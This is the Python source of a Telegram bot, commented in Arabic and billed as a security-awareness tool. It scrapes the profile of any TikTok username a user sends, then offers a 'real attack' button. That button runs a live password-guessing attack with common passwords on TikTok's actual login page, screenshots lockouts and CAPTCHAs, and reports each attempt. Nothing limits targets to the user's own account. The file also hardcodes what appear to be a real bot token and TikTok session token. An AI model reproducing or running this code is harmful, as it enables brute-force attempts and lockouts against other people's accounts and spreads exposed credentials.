import asyncio
import logging
import os
import random
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from playwright.async_api import async_playwright

# ╔══════════════════════════════════════════════════════════╗
# ║                                                          ║
# ║   🔧 الإعدادات — غيّر القيم هنا فقط                     ║
# ║                                                          ║
# ╚══════════════════════════════════════════════════════════╝

# ← ضع توكن البوت هنا (من @BotFather)
TELEGRAM_TOKEN = "8974546244:AAGSIwbh9FmENOiKYP2tS33_Z-ixjPl0cl4"

# ← ضع msToken هنا (من Chrome على اللابتوب)
MS_TOKEN = "SbKFBxCvan4R3PIo-ovCRQJlkFTO5Qw0KrohBHLjoUEedVgbHsLTqD_-9UV-ekPwqI3w9fFGSm-huPCuPyYTVHBAHN-gy0r7xxULubTNgbS2joRZlMNxPb6ZSQllF2IKerlcfqY63ZPWCwXJCAezA-sWFkarhU-OtpTX4Qdc"

# ╔══════════════════════════════════════════════════════════╗
# ║                                                          ║
# ║   🚀 لا تعدل أي شي تحت هذا السطر                        ║
# ║                                                          ║
# ╚══════════════════════════════════════════════════════════╝

# قراءة القيم من متغيرات البيئة (إذا كانت متوفرة)، وإلا استخدم القيم اللي فوق
TOKEN = os.environ.get("TELEGRAM_TOKEN", TELEGRAM_TOKEN)
MY_MS_TOKEN = os.environ.get("MY_MS_TOKEN", MS_TOKEN)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# ============================================================
# 1. سيرفر Keep-Alive
# ============================================================
async def handle(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logging.info(f"✅ Web server started on port {port}")

# ============================================================
# 2. دالة جلب معلومات الحساب
# ============================================================
async def get_tiktok_user_info(username: str):
    async with async_playwright() as p:
        try:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            
            await context.add_cookies([
                {
                    "name": "msToken",
                    "value": MY_MS_TOKEN,
                    "domain": ".tiktok.com",
                    "path": "/"
                }
            ])
            
            page = await context.new_page()
            await page.goto(f"https://www.tiktok.com/@{username}",
                          wait_until="domcontentloaded", timeout=25000)
            await asyncio.sleep(3)
            
            data = await page.evaluate('''() => {
                try {
                    const script = document.getElementById('__UNIVERSAL_DATA_FOR_REHYDRATION__');
                    if (!script) return null;
                    const json = JSON.parse(script.textContent);
                    const userInfo = json.__DEFAULT_SCOPE__['webapp.user-detail'].userInfo;
                    return { user: userInfo.user, stats: userInfo.stats };
                } catch(e) { return null; }
            }''')
            
            await browser.close()
            
            if not data:
                return None
            
            user_obj = data.get('user', {})
            stats = data.get('stats', {})
            
            create_time = user_obj.get("createTime", 0)
            create_date = datetime.fromtimestamp(int(create_time)).strftime("%d-%m-%Y") if create_time else "غير معروف"
            
            country = user_obj.get("region", "غير معروف")
            country_map = {
                "SA": "السعودية 🇸🇦", "IQ": "العراق 🇮🇶", "AE": "الإمارات 🇦🇪",
                "EG": "مصر 🇪🇬", "KW": "الكويت 🇰🇼", "QA": "قطر 🇶🇦",
                "JO": "الأردن 🇯🇴", "MA": "المغرب 🇲🇦", "DZ": "الجزائر 🇩🇿",
                "TN": "تونس 🇹🇳", "US": "أمريكا 🇺🇸", "GB": "بريطانيا 🇬🇧"
            }
            country_name = country_map.get(country, country)
            
            return {
                'nickname': user_obj.get("nickname", username),
                'unique_id': user_obj.get("uniqueId", username),
                'follower_count': stats.get("followerCount", 0),
                'following_count': stats.get("followingCount", 0),
                'friends_count': stats.get("friendCount", 0),
                'heart_count': stats.get("heartCount", 0),
                'video_count': stats.get("videoCount", 0),
                'create_time': create_date,
                'country': country_name,
                'verified': user_obj.get("verified", False),
                'signature': user_obj.get("signature", "")
            }
        except Exception as e:
            logging.error(f"❌ Error: {e}")
            return None

# ============================================================
# 3. تنسيق الأرقام
# ============================================================
def format_number(num):
    try:
        num = int(num)
        if num >= 1_000_000: return f"{num/1_000_000:.1f}M"
        elif num >= 1_000: return f"{num/1_000:.1f}K"
        return str(num)
    except:
        return str(num)

# ============================================================
# 4. الهجوم الحقيقي
# ============================================================
async def real_brute_force_attack(username: str, message_obj: types.Message):
    common_passwords = ["123456", "password", "123456789", "qwerty",
                        "abc123", "admin", "111111", "000000"]
    
    report = (
        f"🚀 **بدء هجوم تخمين حقيقي على @{username}**\n\n"
        f"⚠️ **تجربة تعليمية**\n\n"
        f"🔍 جاري فتح المتصفح...\n\n"
    )
    
    msg = await message_obj.reply(report, parse_mode="Markdown")
    await asyncio.sleep(2)
    
    account_locked = False
    captcha = False
    screenshot_path = None
    
    async with async_playwright() as p:
        try:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            
            for i, pwd in enumerate(common_passwords, 1):
                try:
                    context = await browser.new_context(
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        viewport={"width": 1280, "height": 720}
                    )
                    
                    await context.add_cookies([
                        {"name": "msToken", "value": MY_MS_TOKEN,
                         "domain": ".tiktok.com", "path": "/"}
                    ])
                    
                    page = await context.new_page()
                    await page.goto("https://www.tiktok.com/login/phone-or-email/email",
                                  wait_until="domcontentloaded", timeout=25000)
                    await asyncio.sleep(3)
                    
                    content = await page.content()
                    if any(kw in content.lower() for kw in ["account locked", "temporarily locked", "too many attempts"]):
                        report += f"**[محاولة {i}]** `{pwd}`\n  └─ 🔒 **الحساب مقفول بالفعل!**\n\n"
                        account_locked = True
                        await page.screenshot(path="account_locked.png")
                        screenshot_path = "account_locked.png"
                        await context.close()
                        break
                    
                    report += f"**[محاولة {i}]** `{pwd}` ➔ 🔄 جاري التجربة...\n"
                    
                    try:
                        email_input = await page.wait_for_selector('input[type="text"]', timeout=5000)
                        await email_input.fill(username)
                        password_input = await page.wait_for_selector('input[type="password"]', timeout=5000)
                        await password_input.fill(pwd)
                        login_btn = await page.wait_for_selector('button[type="submit"]', timeout=5000)
                        await login_btn.click()
                        await asyncio.sleep(4)
                        
                        page_content = await page.content()
                        
                        if any(kw in page_content.lower() for kw in ["too many attempts", "try again later", "account locked", "temporarily locked"]):
                            report += f"  └─ 🔒 **تم قفل الحساب مؤقتاً!**\n\n"
                            account_locked = True
                            await page.screenshot(path="account_locked.png")
                            screenshot_path = "account_locked.png"
                            await context.close()
                            break
                        
                        if "captcha" in page_content.lower() or "verify" in page_content.lower():
                            report += f"  └─ 🔒 **TikTok طلب CAPTCHA**\n\n"
                            captcha = True
                            await page.screenshot(path="captcha.png")
                            screenshot_path = "captcha.png"
                        elif "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                            report += f"  └─ ❌ كلمة مرور خاطئة\n\n"
                        else:
                            report += f"  └─ ❌ فشل (401)\n\n"
                    except Exception as inner_e:
                        report += f"  └─ ❌ خطأ: {str(inner_e)[:50]}\n\n"
                    
                    await context.close()
                    
                    try:
                        await msg.edit_text(report, parse_mode="Markdown")
                    except: pass
                    
                    await asyncio.sleep(3)
                except Exception as e:
                    report += f"  └─ ❌ خطأ: {str(e)[:50]}\n\n"
                    continue
            
            await browser.close()
        except Exception as e:
            logging.error(f"❌ Playwright Error: {e}")
            report += f"\n❌ **خطأ:** {str(e)[:100]}\n"
    
    if account_locked:
        report += (
            f"\n\n╔══════════════════════════════╗\n"
            f"║   🔒 **تم قفل الحساب!**   ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"📌 **النتيجة:** TikTok قفل **الحساب نفسه**.\n"
            f"⏱️ **مدة القفل:** 30 دقيقة - 24 ساعة.\n"
        )
    elif captcha:
        report += f"\n\n🔒 **النتيجة:** TikTok طلب CAPTCHA.\n"
    else:
        report += f"\n\n✅ **النتيجة:** فشل الهجوم.\n"
    
    report += (
        f"\n\n💡 **الدرس:**\n"
        f"1️⃣ TikTok يحمي حسابك تلقائياً\n"
        f"2️⃣ **2FA** هو الحماية الأقوى\n"
        f"3️⃣ استخدم كلمة مرور قوية\n"
    )
    
    try:
        await msg.edit_text(report, parse_mode="Markdown")
        if screenshot_path:
            with open(screenshot_path, "rb") as photo:
                await message_obj.reply_photo(photo, caption="📸 صورة حقيقية من TikTok")
    except Exception as e:
        logging.error(f"Edit error: {e}")

# ============================================================
# 5. أوامر البوت
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 **بوت التوعية الأمنية**\n\n"
        "🔍 أرسل يوزر حسابك التجريبي.",
        parse_mode="Markdown"
    )

@dp.message()
async def check_tiktok_handler(message: types.Message):
    username = message.text.strip().replace("@", "")
    if not username:
        await message.answer("❌ أرسل يوزر صحيح.")
        return
    
    processing_msg = await message.answer(f"⏳ جاري جلب بيانات @{username} ...")
    data = await get_tiktok_user_info(username)
    
    if not data:
        await processing_msg.edit_text("❌ تعذر جلب البيانات. تأكد من msToken.")
        return
    
    verified_badge = " ✅" if data['verified'] else ""
    
    info_text = (
        f"👤 **معلومات الحساب:** @{data['unique_id']}{verified_badge}\n\n"
        f"🔹 **الاسم:** {data['nickname']}\n"
        f"🔸 **المتابعين:** {format_number(data['follower_count'])}\n"
        f"👥 **يتابع:** {format_number(data['following_count'])}\n"
        f"🤝 **الأصدقاء:** {format_number(data['friends_count'])}\n"
        f"❤️ **الإعجابات:** {format_number(data['heart_count'])}\n"
        f"🎬 **الفيديوهات:** {format_number(data['video_count'])}\n"
        f"📅 **تاريخ الإنشاء:** {data['create_time']}\n"
        f"🌐 **الدولة:** {data['country']}"
    )
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🔐 ابدأ الهجوم الحقيقي", callback_data=f"realhack_{username}")
    
    await processing_msg.edit_text(info_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data.startswith("realhack_"))
async def process_real_hack(callback: types.CallbackQuery):
    username = callback.data.split("_", 1)[1]
    await callback.answer("⚡ جاري بدء الهجوم...", show_alert=True)
    await real_brute_force_attack(username, callback.message)

# ============================================================
# 6. التشغيل
# ============================================================
async def main():
    logging.basicConfig(level=logging.INFO)
    await start_web_server()
    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("✅ Bot is polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
